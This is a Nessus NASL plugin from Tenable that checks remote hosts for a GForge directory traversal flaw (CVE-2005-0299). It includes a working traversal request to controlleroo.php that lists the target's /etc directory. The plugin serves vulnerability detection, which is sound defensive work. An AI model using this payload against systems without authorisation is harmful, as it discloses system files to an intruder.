#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
  script_id(16225);
  script_version("$Revision: 1.8 $");
  script_cve_id("CVE-2005-0299");
  script_bugtraq_id(12318);
  script_xref(name:"OSVDB", value:"13088");
  script_xref(name:"OSVDB", value:"13089");
  
  script_name(english:"GForge Multiple Script Traversal Arbitrary Directory Listing");
  script_summary(english:"Checks for a flaw in GForge");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a PHP application that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GForge, a CVS repository browser written 
in PHP. The installed version fails to properly sanitize user supplied
dat to the 'dir' URI parameter in the 'controller.php' script, or the
'dir_name' parameter in the 'controlleroo.php' script. An attacker
could exploit this flaw to disclose the content of arbitrary
directories stored on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-01/0236.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GForge 4.0.0 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencie("http_version.nasl");
  exit(0);
}


include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:80, embedded: 0);
if ( ! can_host_php(port:port) ) exit(0);

foreach dir ( cgi_dirs() )
{
  r = http_send_recv3(method:"GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  if ( "gforge.org" >< tolower(r[2]))
  {
    for ( i = 0 ; i < 15 ; i ++ )
    {
      r = http_send_recv3(method:"GET", item:string(dir, "/scm/controlleroo.php?group_id=",i,"&dir_name=../../../../../../../../etc"), port:port);
      if (isnull(r)) exit(0);
      if ( "passwd" >< r[2] &&
           "group"  >< r[2] &&
           "resolv.conf" >< r[2] &&
           "hosts" >< r[2] )
      {
        security_warning(port);
        exit(0);
      }
    }
    exit(0);
  }  
}
